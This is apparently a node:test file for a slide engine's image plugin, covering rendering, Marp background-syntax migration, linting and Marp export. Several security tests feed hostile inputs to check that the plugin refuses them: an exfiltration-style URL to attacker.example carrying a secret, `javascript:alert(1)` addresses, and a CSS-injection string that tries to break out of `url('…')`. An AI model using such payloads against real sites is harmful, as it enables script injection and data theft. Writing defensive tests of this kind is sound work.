
/**
 * The image plugin (lib/plugins/image; engineering/decisions/2026-10-16-media-plugins.md §4.2, §4.5, §8 decision 2): the address
 * comes only from the author's own record, the slide seats the picture, Marp's keywords migrate losslessly, and the Marp bundle
 * writes Marp's own spelling.
 */
const { describe, test } = require('node:test');
const assert = require('node:assert/strict');
const { JSDOM } = require('jsdom');
const engine = require('../../../lib/engine');
const dispatcher = require('../../../lib/core/inline-code-directives.js');
const { migrateBgLine, classLineWith } = require('../../../lib/plugins/image/shared/image-migrate.js');
const { withImageMarkdown: translate } = require('../../../lib/plugins/image/shared/image-marp-export.js');
const { picturePlacement } = require('../../../lib/export/picture-placement.js');
// The translation as the bundle calls it (lib/export/marp-bundle.js): with the export host's reading of where pictures are placed.
const withImageMarkdown = (md, opts, ctx) => translate(md, { ...opts, placement: picturePlacement(md) }, ctx);
const { ctxFor } = require('../../../lib/core/plugin-ctx.js');
const { lintText, buildVocab } = require('../../../lib/authoring/lint.js');

const deck = (cls, body) => `---\ntheme: indaco\n---\n\n<!-- _class: ${cls} -->\n\n## T\n\n${body}\n`;
const html = (md) => engine.render(md).html;

describe('the address comes only from the author\'s record (§4.5)', () => {
  test('the DOM path never draws a picture record: a plugin\'s `<code>@image{…}</code>` stays text', () => {
    const doc = new JSDOM('<!doctype html><body></body>').window.document;
    assert.equal(dispatcher.renderElement(doc, '@image{https://attacker.example/?d=secret}'), null);
    assert.equal(dispatcher.renderHtml('@image{https://attacker.example/?d=secret}'), null, 'not inline HTML either');
  });

  test('the kind is declared address, named-only and block', () => {
    const row = require('../../../lib/plugins/inline.generated.js').INLINE.find((k) => k.name === 'image');
    assert.equal(row.address, true);
    assert.equal(row.namedOnly, true);
    assert.equal(row.block, true);
  });

  test('a scheme the allowlist refuses draws nothing', () => {
    assert.doesNotMatch(html(deck('content', '`@image{"javascript:alert(1)"}`')), /data-lattice-media="image"/);
  });

  test('a record in a sentence stays code, and lint says so', () => {
    const md = deck('content', 'See `@image{photo.jpg}` here.');
    assert.doesNotMatch(html(md), /data-lattice-media="image"/);
    const f = lintText(md, buildVocab());
    assert.ok((f.findings || f).some((x) => x.rule === 'image-not-alone'));
  });
});

describe('the slide places the picture', () => {
  test('an image slide: the layout\'s panel, exactly where `![bg](x)` put it', () => {
    const rec = html(deck('image', '`@image{photo.jpg}`'));
    assert.match(rec, /<div class="lattice-bg lattice-bg-full" data-lattice-media="image"[^>]*style="background-image:url\('photo\.jpg'\)"><\/div><div class="image-text">/);
  });

  test('`mirror` puts the panel on the left; `bleed` makes it the background; a collage keeps it a tile', () => {
    assert.match(html(deck('image mirror', '`@image{photo.jpg}`')), /lattice-bg lattice-bg-left/);
    assert.match(html(deck('content dark bleed', '`@image{photo.jpg}`')), /lattice-bg lattice-bg-full/);
    const col = html(deck('collage', '- `@image{a.jpg, title="A", frame=mat}`\n- `@image{b.jpg, title="B"}`'));
    assert.match(col, /<li class="collage-tile" data-label="A"><img src="a\.jpg" alt="A"/);
    assert.doesNotMatch(col, /data-frame="mat"/, 'a collage tile ignores the frame');
  });
});

describe('Marp\'s keywords to Markdown\'s picture, the record\'s shortcut (§8 decision 2)', () => {
  test('placement moves to the slide, and what was never drawn is named', () => {
    assert.deepEqual(migrateBgLine('![bg left:40% blur:10px](sample:photo-wide.svg)', ['image']), { record: '![](sample:photo-wide.svg)', addClass: 'mirror', dropped: [':40%', 'blur:10px'] });
    assert.deepEqual(migrateBgLine('![bg](p.jpg "The lake")', ['content', 'dark']), { record: '![The lake](p.jpg)', addClass: 'bleed', dropped: [] });
    assert.equal(migrateBgLine('![bg right](p.jpg)', ['image']).addClass, null);
    assert.equal(migrateBgLine('Some text ![bg](p.jpg)', ['image']), null, 'only a line that is one directive');
  });

  test('the description becomes the name, escaped, and never reads as the keyword again', () => {
    assert.equal(migrateBgLine('![bg](p.jpg "A [draft] a\\b")', ['image']).record, '![A \\[draft\\] a\\\\b](p.jpg)');
    assert.equal(migrateBgLine('![bg](p.jpg "bg of the lake")', ['image']).record, '![Image: bg of the lake](p.jpg)');
    assert.equal(migrateBgLine('  ![bg](p.jpg "a `b` c")', ['image']).record, '  ![a `b` c](p.jpg)', 'a backtick is safe in a name');
  });

  test('the migrated line is the slide\'s placed picture, as the record was', () => {
    for (const cls of ['image', 'image mirror', 'content dark bleed']) {
      const out = html(deck(cls, migrateBgLine('![bg](p.jpg "The lake")', cls.split(' ')).record));
      assert.match(out, /class="lattice-bg/, cls);
    }
  });

  test('the class line gains the word once', () => {
    assert.equal(classLineWith('<!-- _class: image -->', 'mirror'), '<!-- _class: image mirror -->');
    assert.equal(classLineWith('<!-- _class: image mirror -->', 'mirror'), '<!-- _class: image mirror -->');
    assert.equal(classLineWith('Not a comment', 'mirror'), null);
  });

});

describe('every `![bg]` the engine no longer reads is named, and `--fix` only rewrites what keeps the photo (the trio on the engine break)', () => {
  const { fixAllDetailed } = require('../../../lib/authoring/lint-core.js');
  const vocab = buildVocab();
  const keyword = (md) => (lintText(md, vocab).findings || lintText(md, vocab)).filter((f) => f.rule === 'image-marp-keyword');
  const fixed = (md) => fixAllDetailed(md, vocab).text;

  test('a `![bg]` anywhere markdown reads a picture is named, not only one at the start of a line', () => {
    for (const body of ['Intro ![bg](x.jpg) text', '- ![bg](x.jpg)', '> ![bg left](x.jpg)', '![ bg](x.jpg)', '| ![bg](x.jpg) | y |\n|---|---|', '## ![bg](x.jpg) Seven', '![BG right](x.jpg)']) {
      const f = keyword(deck('content', body));
      assert.equal(f.length, 1, body);
      assert.ok(f[0].line.includes('x.jpg'), `${body}: the finding names the line`);
    }
  });

  test('a `![bg]` in prose keeps the slide\'s real photo out of its panel, and the lint says why', () => {
    const md = deck('image', '![The lake](sample:photo-wide.svg)\n\nSee the map ![bg](logo.svg) here.');
    assert.doesNotMatch(html(md), /class="lattice-bg /, 'rule 5: the kernel declines the photo');
    assert.equal(keyword(md).length, 1, 'and the lint names the `![bg]` that caused it');
  });

  test('two `![bg]` on one slide: named, never rewritten into two pictures that place neither', () => {
    for (const body of ['![bg](a.jpg)\n![bg](b.jpg)', '![bg](a.jpg)\n\n![bg](b.jpg)']) {
      const md = deck('content', body);
      assert.ok(keyword(md).length >= 2, body);
      assert.equal(fixed(md), md, `${body}: no machine fix`);
    }
  });

  test('a `![bg]` sharing its paragraph with text, or beside another lone picture, is not rewritten', () => {
    for (const [cls, body] of [['image', '![bg right](x.jpg)\nA caption on the next line.'], ['image', '![bg right](photo.jpg)\n\n![Acme](logo.png)'], ['content', '![bg](photo.jpg)\n\n![Chart](chart.png)']]) {
      const md = deck(cls, body);
      assert.equal(keyword(md).length, 1, body);
      assert.equal(fixed(md), md, `${body}: no machine fix`);
    }
  });

  test('the plain case still rewrites, and the result is the slide\'s photo', () => {
    const md = deck('content dark', '![bg](photo.jpg "The lake")');
    const out = fixed(md);
    assert.match(out, /<!-- _class: content dark bleed -->/);
    assert.match(out, /^!\[The lake\]\(photo\.jpg\)$/m);
    assert.match(html(out), /class="lattice-bg /);
    assert.equal(keyword(out).length, 0);
  });

  test('a pasted phone photo (a multi-megabyte `data:` address) is placed, and its address comes back byte for byte', () => {
    const { placedPictureInSlide } = require('../../../lib/core/placed-picture.js');
    const { boundaryParser } = require('../../../lib/core/boundary-parser.js');
    const big = `data:image/jpeg;base64,${'AbC+/9'.repeat(100_000)}==`;
    const small = 'data:image/png;base64,AAAA';
    for (const src of [big, small]) {
      const pic = placedPictureInSlide(deck('image', `![Phone photo](${src})`), ['image'], { md: boundaryParser });
      assert.equal(pic?.src, src, src.slice(0, 30));
    }
  });

  test('a Library photo described "BG …" is the author\'s words, so it is still placed', () => {
    const out = engine.render('<!-- _class: image -->\n\n# Team\n\n![](asset:team)\n', undefined, { assetUrls: { team: 'https://x.example/t.jpg' }, assetAlts: { team: 'BG team at the offsite' } }).html;
    assert.match(out, /class="lattice-bg /);
  });
});

describe('Export-to-Marp writes Marp\'s own spelling', () => {
  const ctx = ctxFor('image');
  test('a panel or a background becomes `![bg]`, a flow figure a plain image', () => {
    assert.match(withImageMarkdown(deck('image', '`@image{p.jpg, description="D"}`'), {}, ctx), /^!\[bg\]\(p\.jpg "D"\)$/m);
    assert.match(withImageMarkdown(deck('content bleed', '`@image{p.jpg}`'), {}, ctx), /^!\[bg\]\(p\.jpg\)$/m);
    assert.match(withImageMarkdown(deck('content', '`@image{p.jpg, title="T", frame=mat}`'), {}, ctx), /^!\[T\]\(p\.jpg\)$/m);
  });

  test('a record the engine leaves as code is left as code', () => {
    const fenced = deck('content', '```markdown\n`@image{p.jpg}`\n```');
    assert.equal(withImageMarkdown(fenced, {}, ctx), fenced);
    const inText = deck('content', 'Text\n`@image{p.jpg}`');
    assert.equal(withImageMarkdown(inText, {}, ctx), inText);
  });
});

describe('the trio\'s findings on slice 3 stay fixed', () => {
  test('an entity in the address stays text inside `url(\'…\')`: no quote, no second url, nothing remote', () => {
    const out = html(deck('image', '`@image{"x&#39;&#41;;position:fixed;background-image:url&#40;&#39;http://attacker.example/a.png"}`'));
    const style = /<div class="lattice-bg[^>]*style="([^"]*)"/.exec(out)[1];
    const decoded = new JSDOM(`<div style="${style}"></div>`).window.document.querySelector('div').getAttribute('style');
    assert.equal((decoded.match(/url\(/g) || []).length, 1, decoded);
    assert.equal(decoded.indexOf("')"), decoded.length - 2, 'the url string closes only at its end');
  });

  test('no resolver, no picture: the raw address is never written', () => {
    assert.equal(dispatcher.renderBlockHtml('@image{"javascript:alert(1)"}'), null);
    assert.doesNotMatch(dispatcher.renderBlockHtml('@video{"https://youtu.be/dQw4w9WgXcQ", poster="javascript:x"}') || '', /javascript:/);
  });

  test('a collage packs a record as a tile, like a Markdown image', () => {
    const col = html(deck('collage', '- `@image{a.jpg, title="A"}`\n- `@image{b.jpg, title="B"}`\n- ![C](c.jpg)'));
    assert.match(col, /class="collage-list"/);
    assert.equal((col.match(/<li class="collage-tile"/g) || []).length, 3);
  });

  test('narration speaks a panel\'s words on an image slide and a bleed slide', async () => {
    const { projectDeckToScript } = await import('../../../lib/transformers/prose-projection.mjs');
    for (const cls of ['image', 'content dark bleed']) {
      const dom = new JSDOM(`<!doctype html><body>${html(deck(cls, '`@image{p.jpg, title="Lake title", description="Dawn description"}`'))}</body>`);
      assert.match(JSON.stringify(projectDeckToScript([...dom.window.document.querySelectorAll('section')])), /Lake title\. Dawn description\./, cls);
    }
  });

  test('the title is the name, the description the tooltip: never the title twice', () => {
    const out = html(deck('image', '`@image{p.jpg, title="T", description="D"}`'));
    assert.match(out, /aria-label="T" title="D"/);
  });

  test('the Marp translation follows the engine\'s class rules and its allowlist', () => {
    const ctx = ctxFor('image');
    const md = (fm, cls, body) => `---\n${fm}\n---\n\n<!-- _class: ${cls} -->\n\n${body}\n`;
    assert.match(withImageMarkdown(md('class: bleed', 'content', '`@image{p.jpg}`'), {}, ctx), /^!\[bg\]\(p\.jpg\)$/m, 'a deck-wide bleed is appended');
    assert.match(withImageMarkdown(md('class: image', 'content', '`@image{p.jpg}`'), {}, ctx), /^!\[\]\(p\.jpg\)$/m, 'a deck-wide component name is dropped');
    const refused = md('theme: indaco', 'content', '`@image{"javascript:alert(1)"}`');
    assert.equal(withImageMarkdown(refused, {}, ctx), refused);
  });

  test('the migration refuses to rewrite what it would change, and never edits a second directive', () => {
    assert.ok(migrateBgLine('![bg](x&#39;a.jpg)', ['image']).unsafe);
    assert.equal(migrateBgLine('    ![bg](a.jpg)', ['content']), null, 'an indented code block');
    assert.equal(classLineWith('<!-- _class: content --><!-- _paginate: false -->', 'bleed'), null);
  });
});

describe('Markdown\'s picture is the record\'s shortcut on a slide that places one (owner, 2026-11-10)', () => {
  const panel = (out) => /<div class="lattice-bg[^"]*"[^>]*>/.exec(out)?.[0] ?? null;

  test('an image slide, a mirrored one and a bleed slide place `![title](src "description")` as the record would', () => {
    const md = '![A lake](sample:photo-wide.jpg "At dawn")';
    const rec = '`@image{sample:photo-wide.jpg, title="A lake", description="At dawn"}`';
    for (const cls of ['image', 'image mirror', 'content bleed']) {
      assert.equal(panel(html(deck(cls, md))), panel(html(deck(cls, rec))), cls);
      assert.ok(panel(html(deck(cls, md))), `${cls}: a panel`);
    }
    assert.match(panel(html(deck('image mirror', md))), /lattice-bg-left/);
  });

  test('anywhere else, and in a collage, it stays an ordinary picture', () => {
    for (const cls of ['content', 'collage', 'columns']) {
      const out = html(deck(cls, '![A lake](sample:photo-wide.jpg)'));
      assert.equal(panel(out), null, cls);
      assert.match(out, /<img [^>]*alt="A lake"/, cls);
    }
  });

  test('a picture in a list item or a quote stays where it is, and leaves no empty bullet or quote (the checker on this change)', () => {
    for (const body of ['- ![x](y.jpg)\n- ![z](w.jpg)', '> ![x](y.jpg)', '1. ![x](y.jpg)']) {
      const out = html(deck('image', body));
      assert.equal(panel(out), null, body);
      assert.doesNotMatch(out, /<li>\s*<\/li>|<blockquote>\s*<\/blockquote>/, body);
      assert.match(out, /<img /, body);
    }
  });

  test('a slide with two lone pictures places neither: both stay visible, as before', () => {
    const out = html(deck('image', '![a](1.jpg)\n\n![b](2.jpg)'));
    assert.equal(panel(out), null);
    assert.equal((out.match(/<img /g) || []).length, 2);
  });

  test('a line break inside the alt is a space in the picture\'s name', () => {
    assert.match(panel(html(deck('image', '![A lake\nat dawn](y.jpg)'))), /aria-label="A lake at dawn"/);
  });

  test('in running text it stays an ordinary picture', () => {
    assert.equal(panel(html(deck('image', 'See ![A lake](sample:photo-wide.jpg) here.'))), null);
  });

  test('a quote, a backslash or a brace in the words stays text, and nothing reaches the style but the address', () => {
    const out = html(deck('image', '![Say "hi" \\\\ } there](sample:photo-wide.jpg "a \\"b\\" }")'));
    const p = panel(out);
    assert.match(p, /aria-label="Say &quot;hi&quot; \\ } there"/);
    assert.equal((p.match(/url\(/g) || []).length, 1);
  });

  test('an entity in the address stays text inside `url(\'…\')`', () => {
    const out = html(deck('image', '![x](x&#39;&#41;;background-image:url&#40;&#39;http://attacker.example/a.png)'));
    const style = /<div class="lattice-bg[^>]*style="([^"]*)"/.exec(out)?.[1];
    if (style) {
      const decoded = new JSDOM(`<div style="${style}"></div>`).window.document.querySelector('div').getAttribute('style');
      assert.equal((decoded.match(/url\(/g) || []).length, 1, decoded);
      assert.equal(decoded.indexOf("')"), decoded.length - 2, decoded);
    }
  });

  test('`sample:` and `asset:` names resolve through the shortcut as through the record', () => {
    const opts = { samplesUrl: 'https://site.test/samples/', assetUrls: { harbor: 'blob:https://site.test/h' } };
    const s = engine.render(deck('image', '![A lake](sample:photo-wide.jpg)'), 'indaco', opts).html;
    assert.match(panel(s), /url\('https:\/\/site\.test\/samples\/photo-wide\.jpg'\)/);
    const a = engine.render(deck('content bleed', '![A harbor](asset:harbor)'), 'indaco', opts).html;
    assert.match(panel(a), /url\('blob:https:\/\/site\.test\/h'\)/);
  });

  test('a deck with the image plugin switched off keeps the ordinary picture', () => {
    const off = engine.createEngine({ plugins: { disabled: ['image'] } });
    const out = off.render(deck('image', '![A lake](sample:photo-wide.jpg)')).html;
    assert.equal(/data-lattice-media="image"/.test(out), false);
  });
});

describe('Export-to-Marp places the shortcut as it places the record', () => {
  test('a lone `![…](…)` on an image or bleed slide becomes `![bg]` with its destination as written; elsewhere it is untouched', () => {
    const md = '---\ntheme: indaco\n---\n\n<!-- _class: image -->\n\n## T\n\n![A lake](sample:photo-wide.jpg "Dawn")\n\n---\n\n<!-- _class: content -->\n\n![A lake](a.jpg)\n\n---\n\n<!-- _class: content bleed -->\n\n![bg left](b.jpg)\n';
    const out = withImageMarkdown(md, {}, ctxFor('image'));
    assert.match(out, /^!\[bg\]\(sample:photo-wide\.jpg "Dawn"\)$/m);
    assert.match(out, /^!\[A lake\]\(a\.jpg\)$/m);
    assert.match(out, /^!\[bg left\]\(b\.jpg\)$/m);
  });

  test('two lone pictures on a slide, or a collage, stay Markdown pictures in the bundle, as the engine leaves them', () => {
    const two = '---\ntheme: indaco\n---\n\n<!-- _class: image -->\n\n![a](1.jpg)\n\n![b](2.jpg)\n';
    assert.equal(withImageMarkdown(two, {}, ctxFor('image')), two);
    const col = '---\ntheme: indaco\n---\n\n<!-- _class: collage image -->\n\n![a](1.jpg)\n';
    assert.equal(withImageMarkdown(col, {}, ctxFor('image')), col);
  });
});

describe('the engine and Export-to-Marp agree on which picture is placed (inversion on #3126)', () => {
  // The shared table (test/fixtures/placed-picture-cases.json): the engine places the picture when it draws a `.lattice-bg`
  // panel with the image plugin's marker for that address; the export when it writes `![bg](address…)`. Compose answers the
  // same table in docs/src/lib/compose/placed-picture-parity.test.ts, so the three readers agree through it.
  const { cases } = require('../../fixtures/placed-picture-cases.json');
  const e = engine.createEngine();
  const esc = (v) => v.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  for (const { name, md, addr, placed } of cases) {
    test(name, () => {
      const html = e.render(md).html;
      const engineSays = new RegExp(`<div class="lattice-bg[^"]*" data-lattice-media="image"[^>]*url\\('${esc(addr)}'\\)`).test(html);
      const exportSays = withImageMarkdown(md, {}, ctxFor('image')).includes(`![bg](${addr}`);
      assert.equal(engineSays, placed, `the engine (${name})`);
      assert.equal(exportSays, placed, `the export (${name})`);
    });
  }
});

describe('Export-to-Marp writes a placed picture its own line pattern cannot read', () => {
  // A title holding a parenthesis: the line is written from the parse, address only, because the bundle's lift reads
  // `![bg](…)` up to the first `)` (lib/core/bg-directive.js); with the title kept, the panel's address came out
  // `photo.jpg %22Dawn (east` (found by the export comparison on #3132).
  test('a title with parentheses becomes a clean `![bg](address)`', () => {
    const md = '---\ntheme: indaco\n---\n\n<!-- _class: image -->\n## T\n\n![Harbor](https://x.test/p.jpg "Dawn (east)")\n';
    const out = withImageMarkdown(md, {}, ctxFor('image'));
    assert.match(out, /^!\[bg\]\(https:\/\/x\.test\/p\.jpg\)$/m);
  });
  test('an address in angle brackets is written from the parse, never with its brackets', () => {
    const md = '---\ntheme: indaco\n---\n\n<!-- _class: image -->\n## T\n\n![Harbor](<https://x.test/a b.jpg>)\n';
    assert.match(withImageMarkdown(md, {}, ctxFor('image')), /^!\[bg\]\(https:\/\/x\.test\/a%20b\.jpg\)$/m);
  });
  test('an indented closing fence above it does not hide a picture the parse places', () => {
    const md = '---\ntheme: indaco\n---\n\n<!-- _class: image -->\n## T\n\n- ```\n  x\n  ```\n\n![H](https://x.test/c.jpg)\n';
    assert.match(withImageMarkdown(md, {}, ctxFor('image')), /^!\[bg\]\(https:\/\/x\.test\/c\.jpg\)$/m);
  });
  test('a line of text right under it is kept out of the panel\'s HTML block by a blank line', () => {
    // The bundle lifts `![bg]` into a raw `<div>` line, and an HTML block runs to the next blank line: without one, a list
    // right under the picture printed as the text `- a point` in a marp-cli render.
    const md = '---\ntheme: indaco\n---\n\n<!-- _class: image -->\n## T\n\n![Harbor](https://x.test/p.jpg)\n- a point\n';
    assert.match(withImageMarkdown(md, {}, ctxFor('image')), /^!\[bg\]\(https:\/\/x\.test\/p\.jpg\)\n\n- a point$/m);
  });
});

describe('the image lint agrees with the placed-picture rule (test/fixtures/placed-picture-cases.json)', () => {
  // `image-extra-panel` flags a picture exactly where the table says the slide is crowded (several lone pictures, no other
  // photo, so none is placed), and never a picture the engine places.
  const { lintTextWith } = require('../../../lib/authoring/lint-core.js');
  const lintText = (md) => lintTextWith(md, { names: new Set(), modifiers: new Set() });
  const { cases } = require('../../fixtures/placed-picture-cases.json');
  for (const { name, md, addr, placed, crowded } of cases) {
    test(name, () => {
      const flagged = lintText(md).some((f) => f.rule === 'image-extra-panel' && String(f.line).includes(`(${addr}`));
      assert.equal(flagged, !!crowded, `image-extra-panel (${name})`);
      if (placed) assert.equal(flagged, false, `a placed picture is never flagged (${name})`);
    });
  }
});
